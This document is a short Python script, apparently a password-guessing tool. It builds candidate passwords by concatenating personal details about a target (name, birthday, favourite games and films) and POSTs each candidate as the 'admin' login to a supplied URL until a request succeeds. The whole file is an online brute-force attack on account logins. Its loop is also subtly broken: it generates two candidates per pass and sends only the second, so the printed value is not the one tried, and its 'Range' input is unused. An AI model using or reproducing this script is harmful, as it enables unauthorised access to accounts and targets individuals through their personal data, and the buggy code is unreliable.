import requests

class Hack:
    def __init__(self, n, list_information):
        self.n = n
        self.list_information = list_information
    def hack(self):
        list_information = self.list_information

        i = self.n

        password = ''

        while i >= 0:
            text = i % len(list_information)
            i = i // len(list_information)
            password = list_information[text] + password
            if i == 0:
                break

        self.n += 1
        return password

list_information = [
    input('Name: '),
    input('Surname: '),
    input('Age: '),
    input('City: '),
    input('Hobby: '),
    input('Day birthday: '),
    input('Month birthday: '),
    input('Year birthday: '),
    input('Favorite game: '),
    input('Favorite movie:'),
    input('Favorite anime: ')
    ]

user = Hack(0, list_information)

url = input('Url: ')

n = int(input('Range: '))

for i in range(100000):
    print(user.hack())
    res = requests.post(url, json={'login': 'admin', 'password': user.hack()})
    print(res.status_code)
    if res.status_code == 200:
        break